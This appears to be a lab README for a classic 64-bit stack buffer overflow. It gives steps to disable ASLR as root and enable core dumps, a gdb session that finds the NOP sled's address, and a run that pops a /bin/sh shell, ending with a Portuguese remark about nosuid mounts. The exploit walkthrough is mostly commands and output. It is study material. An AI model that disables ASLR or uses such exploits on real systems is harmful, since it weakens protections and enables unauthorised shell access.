How to run 

prepare enviorment 

1 - log as root

2 - run this to stop ASLR:

echo "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"

3 - run this to generate core:

echo "ulimit -c unlimited"

running:

1 - crash

neo@matrix:~/bof64/classic$ ./run.sh 


./run.sh: line 1:  5560 Segmentation fault      (core dumped) ./vulnerable `python expl.py 15 '98e3ffffff7f'`

2 - check where starts 0x909090 change address and run


neo@matrix:~/bof64/classic$ gdb -c ./core
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
[New LWP 5560]
Core was generated by `./vulnerable ������������������������������������������������������������������'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007fffffffe39e in ?? ()
(gdb) x/x100 0x00007fffffffe39e
A syntax error in expression, near `0x00007fffffffe39e'.
(gdb) x/100x 0x00007fffffffe39e
0x7fffffffe39e:	0x5b1aba39	0x8e72efe2	0x78198f15	0x365f3638
0x7fffffffe3ae:	0x00000034	0x2e000000	0x6c75762f	0x6172656e
0x7fffffffe3be:	0x00656c62	0x90909090	0x90909090	0x90909090
0x7fffffffe3ce:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe3de:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe3ee:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe3fe:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe40e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe41e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe42e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe43e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe44e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe45e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe46e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe47e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe48e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe49e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4ae:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4be:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4ce:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4de:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4ee:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4fe:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe50e:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe51e:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) q
neo@matrix:~/bof64/classic$ ./vulnerable `python expl.py 15 'fee3ffffff7f'`
$ q
/bin/sh: 1: q: not found
$ exit
neo@matrix:~/bof64/classic$ ./vulnerable `python expl.py 15 'fee3ffffff7f'`
$ 



3 porque nao pega root ? porque precisa rodar em diretorios nosuid o que pode 
ser verificado com mount






